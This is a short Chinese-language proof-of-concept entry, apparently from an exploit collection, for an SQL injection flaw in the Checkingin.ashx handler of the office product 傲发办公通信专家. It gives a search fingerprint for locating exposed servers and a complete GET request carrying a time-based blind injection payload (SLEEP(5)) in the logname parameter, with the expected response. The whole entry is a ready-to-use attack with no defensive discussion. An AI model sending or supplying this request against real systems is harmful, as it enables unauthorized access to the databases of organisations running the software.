# 傲发办公通信专家Checkingin.ashx存在SQL注入漏洞

傲发办公通信专家 ｜ SQL注入 ｜ —
- **指纹**：`body="getincommingcall"`
- **请求**：`GET /handle/Checkingin.ashx?type=checkingin&logname='+and+(SELECT+*+FROM+(SELECT(SLEEP(5)))x)+and+'&date=1 HTTP/1.1`
- **响应特征**：200